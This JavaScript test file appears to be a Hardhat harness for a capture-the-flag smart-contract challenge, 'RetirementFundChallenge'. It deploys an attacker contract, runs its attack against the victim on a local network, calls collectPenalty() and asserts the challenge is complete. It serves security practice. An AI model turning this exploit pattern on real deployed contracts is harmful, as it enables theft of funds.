const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "RetirementFundChallenge";

describe(NAME, function () {
    describe("exploit", async function () {
        let victimContract;

        it("conduct your attack here", async function () {
            const [owner, attackerWallet] = await ethers.getSigners();
            const AttackerFactory = await ethers.getContractFactory("Solution12");
            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy();

            const VictimFactory = await ethers.getContractFactory(NAME);
            victimContract = await VictimFactory.deploy(attackerWallet.address, {value: ethers.utils.parseEther("1")});

            await attackerContract.connect(attackerWallet).setVictim(victimContract.address);

            await attackerContract.connect(attackerWallet).attack({value: ethers.utils.parseEther("0.1")});
            console.log(await ethers.provider.getBalance(victimContract.address));

            await victimContract.connect(attackerWallet).collectPenalty();
        });

        after(async function () {
            expect(await victimContract.isComplete()).to.be.equal(true);
        });
    });
});